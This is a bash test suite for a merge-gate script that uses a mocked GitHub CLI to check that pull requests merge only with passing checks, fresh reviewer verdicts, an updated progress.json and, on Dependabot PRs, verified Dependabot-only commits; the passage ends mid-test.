#!/usr/bin/env bash
# Tests for scripts/merge-gate.sh (T-M1.1 AC4; review findings F1, F3, F4) using a mocked gh.
set -uo pipefail
source "$(dirname "$0")/lib.sh"
echo "merge-gate.sh"

export GH_BIN="$ROOT/scripts/tests/mock-gh"
export MOCK_DIR; MOCK_DIR=$(mktemp -d)
trap 'rm -rf "$MOCK_DIR"' EXIT

HEAD_TIME="2026-09-25T10:00:00Z"; AFTER="2026-09-25T10:05:00Z"; BEFORE="2026-09-25T09:55:00Z"
c() { jq -n --arg b "$1" --arg t "${2:-$AFTER}" '{body:$b, createdAt:$t}'; }   # one comment
cs() { jq -s . <<<"$*"; }                                                      # comments array

SHA_A=3d3c42e5aac5ba805825da76410c181273ba90b1; SHA_B=de0fac2e4500dabe0009e67214ff5f5447ce83dd
USES_BUMP=$'@@ -20,3 +20,3 @@ jobs:\n     steps:\n-      - uses: actions/checkout@'"$SHA_A"$' # v7.0.1\n+      - uses: actions/checkout@'"$SHA_B"$' # v7.0.2\n       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0'
DEP_COMMIT='{"sha":"74cf1910000000000000000000000000000000aa","author":{"login":"dependabot[bot]"},"committer":{"login":"web-flow"},"commit":{"verification":{"verified":true}}}'
NO_FORCE='{"data":{"repository":{"pullRequest":{"timelineItems":{"nodes":[]}}}}}'
# Optional overrides for the next write_fixture (reset after each): ACTIVITY / RUNS / FORCE / PRCOMMITS / PRFILES (raw JSON as the API returns it)
ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""; MARKER=""
write_job() { # <job id> <marker step name> <conclusion> [head sha]: one Actions job as the jobs API returns it (T-M2.23)
  jq -cn --arg n "$2" --arg c "$3" --arg sha "${4:-abc1234def5678}" '{head_sha:$sha, steps:[{name:"Set up job",conclusion:"success"},{name:$n,conclusion:$c}]}' >"$MOCK_DIR/job-$1.json"; }
write_fixture() { # <head> <base> <mergeState> <comments-json-array> <files-json-array> <checks-json> <behind> [author] [commits-json]
  jq -n --arg head "$1" --arg base "$2" --arg mss "$3" --argjson comments "$4" --argjson files "$5" --arg t "$HEAD_TIME" \
    --arg author "${8:-duochou042004}" --argjson commits "${9:-null}" \
    '{number:7,state:"OPEN",isDraft:false,author:{login:$author},baseRefName:$base,headRefName:$head,headRefOid:"abc1234def5678",mergeStateStatus:$mss,
      comments:$comments,files:$files,changedFiles:($files | length),commits:($commits // [{committedDate:"2026-09-25T09:00:00Z"},{committedDate:$t}])}' >"$MOCK_DIR/pr.json"
  # T-M2.23: every check gets a job link and a job with a successful marker for the base (a full run), unless the fixture gives its own link.
  rm -f "${MOCK_DIR:?}"/job-*.json
  if jq -e 'type == "array"' <<<"$6" >/dev/null 2>&1; then
    jq -c 'to_entries | map(.value + {link: (.value.link // "https://github.com/o/r/actions/runs/1/job/\(.key + 100)")})' <<<"$6" >"$MOCK_DIR/checks.json"
    for i in $(jq -r 'keys[]' <<<"$6"); do write_job $((i + 100)) "Full run on $2" "${MARKER:-success}"; done
  else
    echo "$6" >"$MOCK_DIR/checks.json"
  fi
  echo "$7" >"$MOCK_DIR/behind.txt"
  # Push time (T-M1.7): by default the head was pushed at HEAD_TIME (repository activity; by Dependabot on a Dependabot PR, which created the branch),
  # its pull_request runs were created then, and there was no force-push.
  echo "${ACTIVITY:-$(jq -n --arg t "$HEAD_TIME" --arg a "${8:-duochou042004}" '[{activity_type:(if $a == "app/dependabot" then "branch_creation" else "push" end),
      after:"abc1234def5678", timestamp:$t, actor:{login:(if $a == "app/dependabot" then "dependabot[bot]" else $a end)}}]')}" >"$MOCK_DIR/activity.json"
  echo "${RUNS:-$(jq -n --arg b "$1" --arg t "$HEAD_TIME" '{workflow_runs:[{event:"pull_request",head_sha:"abc1234def5678",head_branch:$b,created_at:$t}]}')}" >"$MOCK_DIR/runs.json"
  echo "${FORCE:-$NO_FORCE}" >"$MOCK_DIR/forcepush.json"
  echo "${PRCOMMITS:-[$DEP_COMMIT]}" >"$MOCK_DIR/pr-commits.json"
  echo "${PRFILES:-$(jq -c --arg bump "$USES_BUMP" '[.[] | {filename:.path, status:"modified",
      patch:(if (.path | startswith(".github/workflows/")) then $bump else "@@ -1 +1 @@\n-a\n+b" end)}]' <<<"$5")}" >"$MOCK_DIR/pr-files.json"
  rm -f "$MOCK_DIR/merged.txt" "$MOCK_DIR"/*.fail
  ACTIVITY=""; RUNS=""; FORCE=""; PRCOMMITS=""; PRFILES=""; MARKER=""
}
gate() { "$ROOT/scripts/merge-gate.sh" "$@"; }
MVN_URL='https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven'
WRAPPER_BUMP=$'@@ -1,3 +1,3 @@\n-wrapperVersion=3.3.4\n+wrapperVersion=3.3.5\n distributionType=only-script\n-distributionUrl='"$MVN_URL"$'/3.9.16/apache-maven-3.9.16-bin.zip\n+distributionUrl='"$MVN_URL"$'/3.9.17/apache-maven-3.9.17-bin.zip'
wrapper_files() { jq -cn --arg p "$1" '[{filename:"backend/.mvn/wrapper/maven-wrapper.properties",status:"modified",patch:$p},{filename:"backend/pom.xml",status:"modified",patch:"@@ -1 +1 @@\n-a\n+b"}]'; }
OK_CHECKS='[{"name":"docs-check","bucket":"pass"},{"name":"secrets-scan","bucket":"pass"},{"name":"backend","bucket":"pass"},{"name":"web","bucket":"pass"},{"name":"contract-drift","bucket":"pass"},{"name":"e2e-smoke","bucket":"pass"}]'
FILES='[{"path":"progress.json"},{"path":"docs/README.md"}]'
GOOD=$(cs "$(c $'DOCS-REVIEW T-M9.9: PASS\nall good')" "$(c 'LC-APPROVED T-M9.9')")

write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "passes when all gates hold (dry run)" -- gate --dry-run 7
[[ ! -f "$MOCK_DIR/merged.txt" ]] && { PASS_COUNT=$((PASS_COUNT+1)); echo "  ok   - dry run does not merge"; } || { FAIL_COUNT=$((FAIL_COUNT+1)); echo "  FAIL - dry run merged"; }
expect_exit 0 "merges when not a dry run" -- gate 7
grep -q -- "--merge --delete-branch --match-head-commit abc1234def5678" "$MOCK_DIR/merged.txt" \
  && { PASS_COUNT=$((PASS_COUNT+1)); echo "  ok   - merge commit, deletes branch, pins the head commit"; } \
  || { FAIL_COUNT=$((FAIL_COUNT+1)); echo "  FAIL - merge flags: $(cat "$MOCK_DIR/merged.txt")"; }

# (a) checks
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"fail"},{"name":"secrets-scan","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check fails" -- gate --dry-run 7
expect_output_contains "required check 'docs-check' is fail" "reports the failing check"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"pending"},{"name":"secrets-scan","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check is pending" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '[{"name":"docs-check","bucket":"pass"}]' 0
expect_exit 1 "(a) refuses when a required check is missing" -- gate --dry-run 7
# T-M1.17: a gh that cannot run `pr checks --json` (too old, API error) or returns a non-array is reported as such, not as missing checks
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
printf 'unknown flag: --json\n\nUsage:  gh pr checks [<number> | <url> | <branch>] [flags]\n' >"$MOCK_DIR/checks.json.fail"
expect_exit 1 "T-M1.17 AC1: refuses when 'gh pr checks --json' fails (old gh)" -- gate --dry-run 7
expect_output_contains "cannot read the PR's checks with 'gh pr checks --json' (needs gh >= 2.101, development-setup §0): unknown flag: --json" "T-M1.17 AC1: names the cause, the needed gh and gh's error"
expect_output_not_contains "is missing" "T-M1.17 AC1: does not report the required checks as missing"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/checks.json.fail"
expect_exit 1 "T-M1.17 AC1: refuses on an API error from 'gh pr checks'" -- gate --dry-run 7
expect_output_contains "HTTP 502 for checks.json" "T-M1.17 AC1: shows gh's error text"
expect_output_not_contains "is missing" "T-M1.17 AC1: an API error is not reported as missing checks"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" '{"message":"Bad credentials"}' 0
expect_exit 1 "T-M1.17 AC2: refuses when the checks output is not a JSON array" -- gate --dry-run 7
expect_output_contains "cannot read the PR's checks with 'gh pr checks --json' (needs gh >= 2.101, development-setup §0): output: {\"message\":\"Bad credentials\"}" "T-M1.17 AC2: shows the unexpected output when gh printed no error"
expect_output_not_contains "is missing" "T-M1.17 AC2: does not report the required checks as missing"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
: >"$MOCK_DIR/checks.json"
expect_exit 1 "T-M1.17 AC2: refuses an empty checks output (review F3)" -- gate --dry-run 7
expect_output_contains "output: (empty)" "T-M1.17 AC2: says the output was empty"
expect_output_not_contains "is missing" "T-M1.17 AC2: empty output is not reported as missing checks"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
printf '{"x":1}\n%s\n' "$OK_CHECKS" >"$MOCK_DIR/checks.json"
expect_exit 1 "T-M1.17 AC2: refuses several JSON documents (review F4)" -- gate --dry-run 7
expect_output_contains "cannot read the PR's checks" "T-M1.17 AC2: several documents are unreadable checks"

# (b) LC approval
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(b) refuses without LC-APPROVED" -- gate --dry-run 7
expect_output_contains "missing fresh 'LC-APPROVED T-M9.9'" "reports missing LC approval"
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9 (after re-review)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(b) LC approval must be the exact line" -- gate --dry-run 7

# (c) verdicts — exact tokens (review F1)
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) refuses a chore PR without DOCS-REVIEW" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED (previous verdict: PASS)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: 'CHANGES REQUESTED (previous verdict: PASS)' is not a pass" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'DOCS-REVIEW T-M9.9: PASS | CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: template placeholder 'PASS | CHANGES REQUESTED' is not a pass" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: FAIL (AC1: PASS, AC2: FAIL)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) F1: 'FAIL (AC1: PASS …)' is not a pass" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: FAIL')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) the latest QA verdict wins (FAIL after PASS)" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) refuses when the latest SEC-REVIEW requests changes" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'UX-REVIEW T-M9.9: APPROVED (with notes)')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) UX-REVIEW must be exactly APPROVED" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS WITH MINOR')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "accepts a feature PR with QA 'PASS WITH MINOR'" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.99: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(c) a verdict for another task id does not count" -- gate --dry-run 7

# stale verdicts (review F3)
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$BEFORE")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F3: a verdict posted before the head commit is stale" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9' "$BEFORE")")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F3: an LC approval posted before the head commit is stale" -- gate --dry-run 7

# (d) up to date, conflicts, bookkeeping, naming
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 3
expect_exit 1 "(d) refuses when the branch is behind its base" -- gate --dry-run 7
expect_output_contains "3 commit(s) behind develop" "reports how far behind"
write_fixture chore/T-M9.9-x develop DIRTY "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses on merge conflicts" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" '[{"path":"docs/README.md"}]' "$OK_CHECKS" 0
expect_exit 1 "refuses when progress.json is not updated" -- gate --dry-run 7
# T-M1.15: the files come from the paginated REST listing, not `gh pr view --json files` (capped at the first 100 files)
BIG=$(jq -cn '[range(100) | {path:"evidence/f\(.).png"}]')
PRFILES="$(jq -cn '[range(100) | {filename:"evidence/f\(.).png",status:"added"}]')
$(jq -cn '[range(29) | {filename:"evidence/g\(.).png",status:"added"}] + [{filename:"progress.json",status:"modified"}]')"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$BIG" "$OK_CHECKS" 0
expect_exit 0 "(T-M1.15) passes when progress.json is the 130th file (on the second page)" -- gate --dry-run 7
PRFILES='[{"filename":"docs/README.md","status":"modified"}]'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(T-M1.15) refuses when only pr view lists progress.json (the REST listing decides)" -- gate --dry-run 7
expect_output_contains "progress.json not updated in this PR" "says progress.json is missing"
PRFILES='[{"filename":"progress.json","status":"removed"}]'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(T-M1.15) refuses when the PR deletes progress.json" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/pr-files.json.fail"
expect_exit 1 "(T-M1.15) refuses when the PR's files cannot be listed (fail closed)" -- gate --dry-run 7
expect_output_contains "cannot list the PR's files (fail closed)" "reports the listing failure"
# T-M1.16 (review T-M1.15 F1, F2): every file page must be an array; progress.json counts only with a status that changes it
PRFILES='[{"filename":"docs/README.md","status":"modified"}]
{"x":{"filename":"progress.json","status":"modified"}}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "(T-M1.16) refuses a file page that is a JSON object (step 5, fail closed)" -- gate --dry-run 7
expect_output_contains "cannot list the PR's files (fail closed)" "reports the non-array page"
for st in unchanged ""; do
  PRFILES=$(jq -cn --arg st "$st" '[{filename:"progress.json"} + (if $st == "" then {} else {status:$st} end)]')
  write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
  expect_exit 1 "(T-M1.16) refuses progress.json with status '${st:-none}'" -- gate --dry-run 7
done
for st in added renamed copied changed; do
  PRFILES="[{\"filename\":\"progress.json\",\"status\":\"$st\"}]"
  write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
  expect_exit 0 "(T-M1.16) accepts progress.json with status '$st'" -- gate --dry-run 7
done
write_fixture wip-branch develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses a branch kind without a merge path" -- gate --dry-run 7
write_fixture feature/T-M9.9-x master CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "refuses a task branch targeting master" -- gate --dry-run 7

# other merge paths (review F4)
write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 0 "F4: dependabot PR (by the Dependabot app) merges with checks + 'LC-APPROVED PR-<n>'" -- gate --dry-run 7
PRFILES=$(jq -cn --arg bump "$USES_BUMP" '{x:{filename:".github/workflows/docs-check.yml",status:"modified",patch:$bump}}')
write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 1 "(T-M1.16) refuses a dependabot file page that is a JSON object (fail closed)" -- gate --dry-run 7
expect_output_contains "cannot list the dependabot PR's files (fail closed)" "reports the non-array dependabot page"
write_fixture dependabot/github_actions/actions-abc develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":".github/workflows/docs-check.yml"}]' "$OK_CHECKS" 0 duochou042004
expect_exit 1 "R2-1: a hand-made dependabot/* branch (human author) is refused" -- gate --dry-run 7
expect_output_contains "not authored by Dependabot" "explains the author check"
write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" '[{"path":"backend/pom.xml"},{"path":"scripts/merge-gate.sh"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 1 "R2-1: a dependabot PR touching non-manifest files is refused" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "R2-4: an explicit DOCS-REVIEW CHANGES REQUESTED is not overridden by QA PASS" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'LC-APPROVED T-M9.9')" "$(c $'Example:\n```\nDOCS-REVIEW T-M9.9: PASS\n```')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "R2-5: a verdict that is not the comment's first line (e.g. in a code block) does not count" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 '[]'
expect_exit 1 "R2-7: an empty commit list is refused (no freshness baseline)" -- gate --dry-run 7
write_fixture release/1.0.0 master CLEAN "$(cs "$(c 'QA-VERDICT 1.0.0: PASS')" "$(c 'LC-APPROVED 1.0.0')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "F4: release PR needs PO-APPROVED" -- gate --dry-run 7
write_fixture release/1.0.0 master CLEAN "$(cs "$(c 'QA-VERDICT 1.0.0: PASS')" "$(c 'PO-APPROVED 1.0.0')" "$(c 'LC-APPROVED 1.0.0')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "F4: release PR merges into master with QA + PO + LC" -- gate --dry-run 7

# ---- T-M1.7 AC1: freshness is judged by when the head ARRIVED on the PR (push time), not by committedDate (R2-2) ----
LATE="2026-09-25T10:10:00Z"
run_at() { jq -n --arg b "$1" --arg t "$2" --arg sha "${3:-abc1234def5678}" --arg ev "${4:-pull_request}" \
  '{workflow_runs:[{event:$ev,head_sha:$sha,head_branch:$b,created_at:$t}]}'; }
BACKDATED='[{"committedDate":"2026-09-25T09:00:00Z"}]'   # the head commit claims 09:00, before the 10:05 verdict
RUNS=$(run_at chore/T-M9.9-x "$LATE")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 "$BACKDATED"
expect_exit 1 "AC1: a back-dated commit pushed AFTER the verdict makes the verdict stale" -- gate --dry-run 7
expect_output_contains "missing fresh 'LC-APPROVED T-M9.9'" "reports the approval as stale"
expect_output_contains "needs a fresh 'DOCS-REVIEW T-M9.9: PASS'" "reports the review as stale"
RUNS=$(run_at chore/T-M9.9-x "$HEAD_TIME")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0 duochou042004 "$BACKDATED"
expect_exit 0 "AC1: the same back-dated commit counts once it arrived BEFORE the verdict" -- gate --dry-run 7
RUNS=$(jq -s '{workflow_runs: map(.workflow_runs[])}' <(run_at chore/T-M9.9-x "$HEAD_TIME") <(run_at chore/T-M9.9-x "$LATE"))
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: the LATEST pull_request run for the head counts (head re-arrived after the verdict)" -- gate --dry-run 7
FORCE=$(jq -n --arg t "$LATE" '{data:{repository:{pullRequest:{timelineItems:{nodes:[{createdAt:$t}]}}}}}')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a force-push after the verdict (back to an already-built SHA) invalidates it" -- gate --dry-run 7
FORCE=$(jq -n --arg t "$BEFORE" '{data:{repository:{pullRequest:{timelineItems:{nodes:[{createdAt:$t}]}}}}}')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC1: a force-push before the head arrived does not block" -- gate --dry-run 7
RUNS='{"workflow_runs":[]}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: no pull_request run for the head (no push-time data) fails closed" -- gate --dry-run 7
expect_output_contains "cannot determine when head abc1234 arrived on the PR" "explains the fail-closed refusal"
RUNS=$(run_at chore/other-branch "$BEFORE")
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a run for the same SHA on ANOTHER branch is no evidence (fails closed)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "$BEFORE" abc1234def5678 push)
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a non-pull_request run is no evidence (fails closed)" -- gate --dry-run 7
RUNS=$(run_at chore/T-M9.9-x "$BEFORE" 0000000000000000)
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a run for another SHA is no evidence (fails closed)" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/runs.json.fail"
expect_exit 1 "AC1: a workflow-runs API error fails closed" -- gate --dry-run 7
expect_output_contains "cannot list workflow runs" "reports the runs API failure"
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
touch "$MOCK_DIR/forcepush.json.fail"
expect_exit 1 "AC1: a PR-timeline API error fails closed" -- gate --dry-run 7
expect_output_contains "cannot read the PR timeline" "reports the timeline failure"
FORCE='{"data":{"repository":{"pullRequest":null}},"errors":[{"message":"x"}]}'
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a PR-timeline answer without timeline data fails closed" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS' "$HEAD_TIME")" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC1: a verdict in the same second as the arrival is not strictly after it" -- gate --dry-run 7

# ---- T-M1.7 AC2: an explicit negative verdict of ANY review type blocks (R3-2) ----
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'QA-VERDICT T-M9.9: FAIL')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: QA-VERDICT FAIL blocks a chore PR even though DOCS-REVIEW passed" -- gate --dry-run 7
expect_output_contains "negative verdict: latest 'QA-VERDICT T-M9.9: FAIL'" "names the blocking verdict"
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: DOCS-REVIEW CHANGES REQUESTED blocks a feature PR even though QA passed" -- gate --dry-run 7
expect_output_contains "'DOCS-REVIEW T-M9.9: CHANGES REQUESTED'" "names the blocking docs review"
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'UX-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'SEC-REVIEW T-M9.9: APPROVED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: UX-REVIEW CHANGES REQUESTED blocks although QA and SEC passed" -- gate --dry-run 7
expect_output_contains "'UX-REVIEW T-M9.9: CHANGES REQUESTED'" "names the blocking UX review"
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: CHANGES REQUESTED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 1 "AC2: SEC-REVIEW CHANGES REQUESTED blocks a chore PR" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: FAIL')" "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: within a type the latest wins (QA FAIL then PASS on re-test) — positive path passes" -- gate --dry-run 7
write_fixture feature/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: PASS')" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'SEC-REVIEW T-M9.9: APPROVED')" "$(c 'UX-REVIEW T-M9.9: APPROVED')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: all four review types positive passes" -- gate --dry-run 7
write_fixture chore/T-M9.9-x develop CLEAN "$(cs "$(c 'QA-VERDICT T-M9.9: FAIL' "$BEFORE")" "$(c 'DOCS-REVIEW T-M9.9: PASS')" "$(c 'LC-APPROVED T-M9.9')")" "$FILES" "$OK_CHECKS" 0
expect_exit 0 "AC2: a stale negative (posted before the head arrived) does not block the new head" -- gate --dry-run 7
write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')" "$(c 'QA-VERDICT PR-7: FAIL')")" '[{"path":"backend/pom.xml"}]' "$OK_CHECKS" 0 app/dependabot
expect_exit 1 "AC2: a negative verdict blocks the dependabot path too" -- gate --dry-run 7

# ---- T-M1.7 AC3: the Dependabot path trusts only Dependabot's commits and a narrow set of changes (R3-1, R3-3) ----
DEP_OK_FILES='[{"path":"backend/pom.xml"},{"path":".github/workflows/web.yml"},{"path":"web/package.json"},{"path":"web/pnpm-lock.yaml"}]'
dep() { write_fixture dependabot/maven/backend/x develop CLEAN "$(cs "$(c 'LC-APPROVED PR-7')")" "$1" "$OK_CHECKS" 0 app/dependabot; }
dep "$DEP_OK_FILES"
expect_exit 0 "AC3: manifests + lockfile + a workflow uses: SHA bump, all by Dependabot, passes" -- gate --dry-run 7
PRCOMMITS="[$DEP_COMMIT,$(jq -c '.author.login="duochou042004" | .committer.login="duochou042004" | .sha="bad0000000000000"' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a human commit on a Dependabot PR blocks" -- gate --dry-run 7
expect_output_contains "commits not made by Dependabot: bad0000 (author=duochou042004" "names the foreign commit"
PRCOMMITS="[$(jq -c '.commit.verification.verified=false' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a Dependabot-authored commit without a verified signature (forged author e-mail) blocks" -- gate --dry-run 7
PRCOMMITS="[$(jq -c '.committer.login="duochou042004"' <<<"$DEP_COMMIT")]"
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: a Dependabot-authored commit committed by a human blocks" -- gate --dry-run 7
PRCOMMITS='[]'
dep '[{"path":"backend/pom.xml"}]'
expect_exit 1 "AC3: an empty commit list from the API fails closed" -- gate --dry-run 7
dep '[{"path":"backend/pom.xml"}]'; touch "$MOCK_DIR/pr-commits.json.fail"
